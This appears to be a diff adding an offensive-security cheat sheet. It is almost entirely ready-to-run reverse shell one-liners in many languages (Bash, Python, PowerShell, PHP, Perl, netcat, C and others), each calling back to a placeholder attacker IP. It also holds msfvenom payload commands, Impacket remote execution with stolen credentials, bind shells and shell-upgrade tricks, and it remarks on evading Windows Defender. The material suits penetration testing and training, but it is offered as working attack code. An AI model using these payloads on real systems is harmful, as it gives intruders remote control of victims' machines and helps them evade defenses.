@@ -1,0 +1,191 @@
+Metasploit
+	if shell fails to connect
+		- check targets
+		- check payloads
+			run options again for payload info
+		- change from staged to non-staged payload
+			e.g. from windows/meterpreter/reverse_tcp
+				to windows/meterpreter_reverse_tcp
+
+Reverse Shells
+
+	using captured credentials
+		quieter but only semi-interactive shells
+			smbexec.py <domain>/<username>:<password>@<victim IP>
+			wmiexec.py <domain>/<username>:<password>@<victim IP>
+		noisy but not detected by Window Defender
+			psexec.py <domain>/<username>:<password>@<victim IP>
+		may not work through Metasploit psexec exploit
+
+
+	**replace /bin/sh with cmd.exe for Windows
+	**listener: nc -nvlp <listen_port>
+
+	BASH
+		TCP
+			bash -i >& /dev/tcp/<attacker_IP>/<listen_port> 0>&1
+		UDP
+			sh -i >& /dev/udp/<attacker IP>/<listen port> 0>&1
+
+	PERL
+		Linux
+			perl -e 'use Socket;$i="<attacker_IP>";$p=<listen_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+		Windows
+			perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attacker IP>:<listen port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+	Python
+		export RHOST="<attacker IP>";export RPORT=<listen port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_IP>",<listen_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+	Powershell
+
+		Bind
+			start-bind -port <listener_port>
+		Listener
+			start-listener -port <remote_port>
+
+		Shell
+			invoke-reversepowershell -reverse -ipaddress <attacker_IP> -port <listener_port>
+
+			invoke-reversepowershell -bind -ipaddress <attacker_IP> -port <listener_port>
+
+
+		powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<attacker IP>",<listen port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+		powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker ip>',<listen port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+	PHP
+		php -r '$sock=fsockopen("<attacker_IP>",<listen_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+			If it doesn’t work, try file descriptor 4, 5, 6… instead of 3
+
+		php -r '$sock=fsockopen("<attacker_IP>",<listen_port>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+	Ruby
+		ruby -rsocket -e'f=TCPSocket.open("<attacker_IP>",<listen_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+	Go
+		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<attacker IP>:<listen port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+
+	Netcat
+		nc <attacker_IP> <listen_port> -e /bin/sh 
+
+		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <attacker IP> <listen_port> >/tmp/f
+
+		rm -f /tmp/p; mknod /tmp/p p && nc <attacker IP> <listen_port> 0/tmp/p
+
+	Socat
+		socat tcp-connect:<attacker IP>:<listen port> exec:"bash -li",pty,stderr,setsid,sigint,sane
+
+	AWK
+		awk 'BEGIN {s = "/inet/tcp/0/<attacker IP>/<listen port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+	NodeJS
+		require('child_process').exec('nc -e /bin/sh <attacker IP> <listen port>')
+
+	Java
+		r = Runtime.getRuntime()
+		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker IP>/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+		p.waitFor()
+
+	xterm
+		Run this on the server. It will try to connect back to <attacker_IP> on TCP  6001:
+		
+		xterm -display 10.0.0.1:1
+
+		To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+
+		Xnest :1
+		
+		You’ll need to authorise the target to connect to you (command also run on your host):
+		
+		xhost +targetip
+		
+	Telnet
+		telnet <attacker IP> 80 | /bin/bash | telnet <attacker IP> <listen port>
+
+		rm -f /tmp/p; mknod /tmp/p p && telnet <attacker IP> <listen port> 0/tmp/p
+
+	Windows using Python 2.7
+		C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<attacker IP>', <listen port>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+
+	Windows using Ruby
+		ruby -rsocket -e 'c=TCPSocket.new("<attacker IP","<listen port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+	C
+		#include <stdio.h>
+		#include <sys/socket.h>
+		#include <netinet/ip.h>
+		#include <arpa/inet.h>
+		#include <unistd.h>
+
+		int main ()
+
+		{
+		const char* ip = "<attacker IP>";
+		struct sockaddr_in addr;
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(<listen port>);
+		inet_aton(ip, &addr.sin_addr);
+		int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+		connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+		for (int i = 0; i < 3; i++)
+		{
+		dup2(sockfd, i);
+		}
+		execve("/bin/sh", NULL, NULL);
+		return 0;
+		}
+
+	Meterpreter
+		Linux Non-Staged
+			msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f elf >reversetcp.elf
+		Linux Staged
+			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f elf >reversetcp.elf
+		Windows Non-Staged
+			msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f exe > reversetcp.exe
+		Windows Staged
+			msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<listen port> -f exe > reversetcp.exe
+
+
+
+Bind Shells
+
+	attacker: nc <victim IP> <listen_port>
+
+	Netcat
+		nc -nvlp <listen_port> -e /bin/sh 
+
+
+Upgrading to TTY Shell
+
+	python -c 'import pty; pty.spawn("/bin/sh")'
+	
+		stty raw -echo
+
+	echo os.system('/bin/bash')
+	
+	/bin/sh -i
+	
+	perl —e 'exec "/bin/sh";'
+	
+	perl: exec "/bin/sh";
+	
+	ruby: exec "/bin/sh"
+	
+	lua: os.execute('/bin/sh')
+	
+	(From within IRB)
+		exec "/bin/sh"
+	
+	(From within vi)
+		:!bash
+	
+	(From within vi)
+		:set shell=/bin/bash:shell
+
+	(From within nmap)
+		!sh
+
